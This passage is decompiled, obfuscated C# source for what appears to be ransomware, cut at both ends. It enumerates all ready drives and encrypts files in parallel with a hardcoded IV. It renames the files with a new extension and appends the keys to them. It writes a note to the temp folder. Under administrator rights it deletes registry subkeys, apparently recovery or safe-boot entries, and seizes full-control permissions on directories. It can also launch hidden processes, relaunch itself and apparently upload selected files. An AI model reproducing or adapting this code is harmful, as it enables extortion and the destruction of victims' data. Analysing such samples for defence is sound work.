		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool MeOAcFDVIYWMs()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107391262));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void jtJLvUlPurQHRX(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = tjPFETNBnBMzUXk(getString_0(107391229));
		processStartInfo.Arguments = getString_0(107391200) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool lILGxkcTMYRwGThf(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string IqGAacPaLSyD(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void DVrtsPxVgHx()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = UdOhEiscoVO(getString_0(107391195));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tjPFETNBnBMzUXk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391537)));
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391512)));
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391527)));
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391470)));
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391229)));
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391445)));
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107391416)));
					registryKey.Close();
				}
				string_ = UdOhEiscoVO(getString_0(107391431));
				registryKey = Registry.LocalMachine.OpenSubKey(tjPFETNBnBMzUXk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107390822)));
					registryKey.Close();
				}
				string_ = UdOhEiscoVO(getString_0(107390773));
				registryKey = Registry.LocalMachine.OpenSubKey(tjPFETNBnBMzUXk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107390822)));
					registryKey.Close();
				}
				string_ = UdOhEiscoVO(getString_0(107390773));
				registryKey = Registry.CurrentUser.OpenSubKey(tjPFETNBnBMzUXk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tjPFETNBnBMzUXk(getString_0(107390822)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107390788)), tjPFETNBnBMzUXk(getString_0(107390739)));
			dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107390722)), tjPFETNBnBMzUXk(getString_0(107390713)));
			dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107390722)), tjPFETNBnBMzUXk(getString_0(107391079)));
			dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107390986)), tjPFETNBnBMzUXk(getString_0(107391001)));
		}
		catch
		{
		}
	}

	public static void oDYBJqpCnUcVu(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(tjPFETNBnBMzUXk(getString_0(107390896)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void nZsnEymlTnO()
	{
		string string_ = UdOhEiscoVO(getString_0(107390871));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tjPFETNBnBMzUXk(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(tjPFETNBnBMzUXk(getString_0(107390310)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void GohpVNQjJO()
	{
		dgFtyqbndoER(getString_0(107396817), tjPFETNBnBMzUXk(getString_0(107390277)));
		string text = tjPFETNBnBMzUXk(getString_0(107390083));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391253) + text + getString_0(107391253) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396817);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void PKUMNiKoIzP(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107390530) + string_0 + getString_0(107390521) + ex.Message + getString_0(107396273));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string pgBFtwVZlq()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393667);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390432);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390423))) ? getString_0(107390437) : getString_0(107390414));
				break;
			case 0:
				text = getString_0(107390460);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390427);
				break;
			case 4:
				text = getString_0(107390382);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107390396) : getString_0(107390405));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107390372) : getString_0(107390345)) : getString_0(107390350)) : getString_0(107390359));
				break;
			case 10:
				text = getString_0(107390367);
				break;
			}
		}
		if (text != getString_0(107393667))
		{
			text = getString_0(107390362) + text;
			if (oSVersion.ServicePack != getString_0(107393667))
			{
				text = text + getString_0(107392749) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string mXpeRwdvjEq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395975);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(tjPFETNBnBMzUXk(getString_0(107395430)));
				streamWriter.WriteLine(getString_0(107396273));
				streamWriter.WriteLine(tjPFETNBnBMzUXk(getString_0(107394580)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107394502) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107390317) + ex.Message + getString_0(107396273));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void wEvxlQCyZAXWA(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		HodDzwKVtgQ.nrgETWiaiUK CS_0024_003C_003E8__locals0 = new HodDzwKVtgQ();
		CS_0024_003C_003E8__locals0.kfhntlBdbyqlPyI = string_1;
		CS_0024_003C_003E8__locals0.tXqjlNtlAwegU = string_2;
		CS_0024_003C_003E8__locals0.cNqEjjpUqBHDJCycCC = string_3;
		CS_0024_003C_003E8__locals0.WVKUKadbJyEcF = string_4;
		JkKFSdXHCQ = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cNqEjjpUqBHDJCycCC);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396602))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !PelwIoYLMluwkT.Contains(array[i].Name))
					{
						PelwIoYLMluwkT.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!PelwIoYLMluwkT.Contains(string_0[j]))
				{
					PelwIoYLMluwkT.Add(string_0[j]);
				}
			}
		}
		if (PelwIoYLMluwkT.Contains(tjPFETNBnBMzUXk(getString_0(107389748))) && HazSUKRRBl == getString_0(107396964))
		{
			PelwIoYLMluwkT.Remove(tjPFETNBnBMzUXk(getString_0(107389748)));
		}
		Parallel.ForEach(PelwIoYLMluwkT, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HodDzwKVtgQ.nrgETWiaiUK();
			CS_0024_003C_003E8__locals0.IjsltDfwDzUt = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.HKWFUJQtGU = string_0;
			if (bLbMRmlIqKb && !pgBFtwVZlq().Contains(HodDzwKVtgQ.getString_0(107390405)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						lILGxkcTMYRwGThf(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.HKWFUJQtGU);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HpbWCpkqwlpVpmb == HodDzwKVtgQ.getString_0(107396973))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					qzMBtnHAoCT(CS_0024_003C_003E8__locals0.HKWFUJQtGU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.kfhntlBdbyqlPyI, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.WVKUKadbJyEcF, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.tXqjlNtlAwegU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.cNqEjjpUqBHDJCycCC);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				qzMBtnHAoCT(CS_0024_003C_003E8__locals0.HKWFUJQtGU, CS_0024_003C_003E8__locals0.kfhntlBdbyqlPyI, CS_0024_003C_003E8__locals0.WVKUKadbJyEcF, CS_0024_003C_003E8__locals0.tXqjlNtlAwegU, CS_0024_003C_003E8__locals0.cNqEjjpUqBHDJCycCC);
			}
		});
	}

	public static void qzMBtnHAoCT(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393667));
		List<string> list3 = list2;
		if (TOzFyVZevgZt == getString_0(107396421))
		{
			list = OZkIIWflaVi(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = sOyIZRPurmEXm.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((YmTiJprAuyeUnyd == getString_0(107396421) && !item.EndsWith(text)) || mfvCVNdCLAD.Contains(item))
				{
					continue;
				}
				if (NjvrgrwIrOwQYj == getString_0(107396964))
				{
					try
					{
						if (MbhBjoLLIvI.dGmUmyWLGZeH(item))
						{
							MbhBjoLLIvI.zNzGMfskfSVrmv(item);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(item);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(item)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (JxuqTkcAaBSWi == getString_0(107396964) && fileStream.Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024 && !list3.Contains(text))
					{
						if (pXuFbktiBaug == getString_0(107396964))
						{
							foreach (string item2 in eiWezuyCGKD)
							{
								if (item.ToLower().EndsWith(item2) && xhUXlAlyfax == getString_0(107396964))
								{
									if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && xhUXlAlyfax == getString_0(107396421))
								{
									try
									{
										VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = kmTsQwtQtSP.NcNnNwTCeGFfUCQ(item, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						byte[] sBpyubiQshOJ = kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						kmTsQwtQtSP.otKhkMkTCKxm(item, sBpyubiQshOJ);
						if (string_2 != getString_0(107389739))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389739))
					{
						ADZDqnebhNRT(item, item + string_2, JkKFSdXHCQ);
					}
					else
					{
						ADZDqnebhNRT(item, item + getString_0(107389766), JkKFSdXHCQ);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void JFzmBipfsgNGYECL(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		iOicLYfXayCEbJ.tUsqmcfKvfUs CS_0024_003C_003E8__locals0 = new iOicLYfXayCEbJ();
		CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl = list_0;
		CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX = string_1;
		CS_0024_003C_003E8__locals0.sIKBGqcsXgr = string_2;
		CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU = string_3;
		CS_0024_003C_003E8__locals0.KWOxGmriSwhi = new List<string> { getString_0(107393667) };
		if (YmTiJprAuyeUnyd == getString_0(107396421))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl)
				{
					if (CS_0024_003C_003E8__locals0.sIKBGqcsXgr.Length != 0)
					{
						string[] sIKBGqcsXgr2 = CS_0024_003C_003E8__locals0.sIKBGqcsXgr;
						int num2 = 0;
						while (num2 < sIKBGqcsXgr2.Length)
						{
							string value2 = sIKBGqcsXgr2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !mfvCVNdCLAD.Contains(item))
					{
						if (NjvrgrwIrOwQYj == iOicLYfXayCEbJ.getString_0(107396981))
						{
							try
							{
								if (MbhBjoLLIvI.dGmUmyWLGZeH(item))
								{
									MbhBjoLLIvI.zNzGMfskfSVrmv(item);
								}
							}
							catch
							{
							}
						}
						mfvCVNdCLAD.Add(item);
						if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(item)))
						{
							PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(item));
						}
						PKUMNiKoIzP(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + item + iOicLYfXayCEbJ.getString_0(107407745) + ex12.Message + iOicLYfXayCEbJ.getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (JxuqTkcAaBSWi == iOicLYfXayCEbJ.getString_0(107396981) && new FileInfo(item).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.KWOxGmriSwhi.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new iOicLYfXayCEbJ.XbuYXBiSsEmiD();
								CS_0024_003C_003E8__locals0.itnzcOJuoNO = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX);
									}
								}
								catch (Exception ex14)
								{
									if (!geeOWbkDyamU)
									{
										break;
									}
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + item + iOicLYfXayCEbJ.getString_0(107407172) + ex14.Message + iOicLYfXayCEbJ.getString_0(107396290));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = iOicLYfXayCEbJ.getString_0(107393684);
								if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
								{
									CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX;
								}
								else
								{
									CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item;
								}
								if (pXuFbktiBaug == iOicLYfXayCEbJ.getString_0(107396981))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in eiWezuyCGKD)
										{
											if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107396984))
											{
												if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw).Length)
												{
													try
													{
														VcazhUwaHziY.bQfUCjfaQPg(iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393736), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393731), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393750), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2) && xhUXlAlyfax == iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107396441))
											{
												try
												{
													VcazhUwaHziY.bQfUCjfaQPg(iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393736), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393731), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393750), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
								string s3 = iPvNPprVZgkkcgBs.qDBKGOSTlO(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = kmTsQwtQtSP.NcNnNwTCeGFfUCQ(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
								kmTsQwtQtSP.otKhkMkTCKxm(SBpyubiQshOJ: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? kmTsQwtQtSP.TYTkjjNuoqpT(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kmTsQwtQtSP.TYTkjjNuoqpT(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? aEtMEwYsisfP.GoUQnzNgJTz(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aEtMEwYsisfP.GoUQnzNgJTz(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), eAyEKDDtpuvhy: CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, zrqCelPaojIsk: bytes3);
							}
							else
							{
								string text4 = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
								string s4 = iPvNPprVZgkkcgBs.qDBKGOSTlO(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
								{
									if (!aDzhxFxDvB)
									{
										if (!HHLzNKWftxhcT)
										{
											JWhESarpabglUv(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, JkKFSdXHCQ);
										}
										else
										{
											JWhESarpabglUv(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!HHLzNKWftxhcT)
											{
												LNWGGHbYeYwY(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, JkKFSdXHCQ);
											}
											else
											{
												LNWGGHbYeYwY(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (geeOWbkDyamU)
											{
												try
												{
													File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + item + iOicLYfXayCEbJ.getString_0(107389774) + ex16.Message + iOicLYfXayCEbJ.getString_0(107396290));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!aDzhxFxDvB)
								{
									if (!HHLzNKWftxhcT)
									{
										JWhESarpabglUv(item, item + iOicLYfXayCEbJ.getString_0(107389783), JkKFSdXHCQ);
									}
									else
									{
										JWhESarpabglUv(item, item + iOicLYfXayCEbJ.getString_0(107389783), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!HHLzNKWftxhcT)
										{
											LNWGGHbYeYwY(item, item, JkKFSdXHCQ);
										}
										else
										{
											LNWGGHbYeYwY(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (geeOWbkDyamU)
										{
											try
											{
												File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + item + iOicLYfXayCEbJ.getString_0(107389774) + ex18.Message + iOicLYfXayCEbJ.getString_0(107396290));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (HHLzNKWftxhcT)
								{
									if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
									{
										oDYBJqpCnUcVu(item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, bytes4);
									}
									else
									{
										oDYBJqpCnUcVu(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new iOicLYfXayCEbJ.tUsqmcfKvfUs();
			CS_0024_003C_003E8__locals0.itnzcOJuoNO = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN = string_0;
			if (CS_0024_003C_003E8__locals0.sIKBGqcsXgr.Length != 0)
			{
				string[] sIKBGqcsXgr = CS_0024_003C_003E8__locals0.sIKBGqcsXgr;
				int num = 0;
				while (num < sIKBGqcsXgr.Length)
				{
					string value = sIKBGqcsXgr[num];
					if (!CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!mfvCVNdCLAD.Contains(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
			{
				if (NjvrgrwIrOwQYj == iOicLYfXayCEbJ.getString_0(107396981))
				{
					try
					{
						if (MbhBjoLLIvI.dGmUmyWLGZeH(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
						{
							MbhBjoLLIvI.zNzGMfskfSVrmv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN));
				}
				PKUMNiKoIzP(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (geeOWbkDyamU)
						{
							try
							{
								File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107407745) + ex2.Message + iOicLYfXayCEbJ.getString_0(107396290));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (JxuqTkcAaBSWi == iOicLYfXayCEbJ.getString_0(107396981) && new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
							{
								File.Move(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX);
							}
						}
						catch (Exception ex4)
						{
							if (geeOWbkDyamU)
							{
								try
								{
									File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107407172) + ex4.Message + iOicLYfXayCEbJ.getString_0(107396290));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
						{
							CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN += CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX;
						}
						if (pXuFbktiBaug == iOicLYfXayCEbJ.getString_0(107396981))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in eiWezuyCGKD)
								{
									if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107396987))
									{
										if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length)
										{
											try
											{
												VcazhUwaHziY.bQfUCjfaQPg(iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393739), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393734), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393753), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
											}
											catch
											{
											}
										}
									}
